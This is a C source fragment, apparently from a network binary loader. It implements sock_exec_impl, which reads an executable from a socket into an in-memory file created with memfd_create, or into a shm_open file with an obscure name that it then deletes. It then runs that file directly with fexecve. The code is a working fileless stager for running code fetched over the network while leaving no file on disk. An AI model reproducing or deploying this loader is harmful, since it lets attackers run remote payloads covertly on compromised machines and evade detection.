#define HAVE_LINUX_MEMFD
#define HAVE_INET_PTON
#define NO_FALLBACK
#define USE_FORK


#ifdef HAVE_LINUX_MEMFD

#define NETELF_OVERRIDE_SOCKEXEC

#include <sys/syscall.h>
#include <linux/memfd.h>

static int sock_exec_fallback(int sockfd, unsigned int nbytes, char **argv);
static unsigned int sock_readbytes(int sockfd, char *buf, unsigned int nbytes);

/*
 * No glibc wrappers exist for memfd_create(2), so provide our own.
 *
 * Also define memfd fcntl sealing macros. While they are already
 * defined in the kernel header file <linux/fcntl.h>, that file as
 * a whole conflicts with the original glibc header <fnctl.h>.
 */

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

#ifndef F_LINUX_SPECIFIC_BASE
#define F_LINUX_SPECIFIC_BASE 1024
#endif

#ifndef F_ADD_SEALS
#define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)

#define F_SEAL_SEAL     0x0001  /* prevent further seals from being set */
#define F_SEAL_SHRINK   0x0002  /* prevent file from shrinking */
#define F_SEAL_GROW     0x0004  /* prevent file from growing */
#define F_SEAL_WRITE    0x0008  /* prevent writes */
#endif


static int
sock_exec_impl( int sockfd, unsigned int nbytes, char **argv ) {
    char *ptr, *buf;
    int shm_fd, rc;
    int method = 0;
    extern char **environ;

    shm_fd = memfd_create("\254", MFD_CLOEXEC); 
    if( shm_fd < 0 || errno == ENOSYS ) {
        method = 1;
        shm_fd = shm_open("\254", O_RDWR | O_CREAT, 0777); 
        if (shm_fd == -1) { 
#ifndef QUIET
            perror("shm_open"); 
#endif
            return sock_exec_fallback(sockfd, nbytes, argv);
        }
    }

    rc = ftruncate(shm_fd, nbytes); 
    if (rc == -1) {
        close(shm_fd);
#ifndef QUIET
        perror("ftruncate");
#endif
        return sock_exec_fallback(sockfd, nbytes, argv);
    }

    buf = ptr = (char *)mmap(NULL, nbytes, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0); 
    if (ptr == MAP_FAILED) { 
#ifndef QUIET
        perror("mmap");
#endif
        close(shm_fd);
        return sock_exec_fallback(sockfd, nbytes, argv);
    }

    sock_readbytes(sockfd, buf, nbytes);

    munmap(ptr, nbytes); 
    
    if( method == 1 ) {        
        close(shm_fd); 
        shm_fd = shm_open("\254", O_RDONLY, 0);
        remove("/dev/shm/\254");
    }

    fexecve(shm_fd, argv, environ); 
#ifndef QUIET
    perror("fexecve"); 
#endif
    return 6;
}

#define sock_exec_impl sock_exec_fallback

#endif
/* HAVE_LINUX_MEMFD */
